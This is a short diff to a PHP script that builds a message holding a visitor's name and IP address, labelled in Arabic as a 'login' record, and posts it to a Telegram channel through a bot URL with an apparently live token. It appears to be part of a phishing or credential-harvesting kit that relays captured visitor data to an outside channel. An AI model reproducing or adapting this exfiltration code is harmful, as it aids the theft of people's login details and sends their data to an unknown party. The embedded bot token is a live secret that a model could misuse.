@@ -9,8 +9,9 @@ $bot_url = 'https://api.telegram.org/bot6941631904:AAHfNlGSRsCLs23y6QMtFoq_p9o8p
 // Telegram channel ID
 $channel_id = '-1001923193748';
 // Message to be sent to the channel
-$message =   " ◤❹◥
+$message =   " ◤تسجيل دخول◥
 Name ►►► $name
+
 IP ►►► $ip ||" ; 
 
 // Send the message to the Telegram channel using the bot API
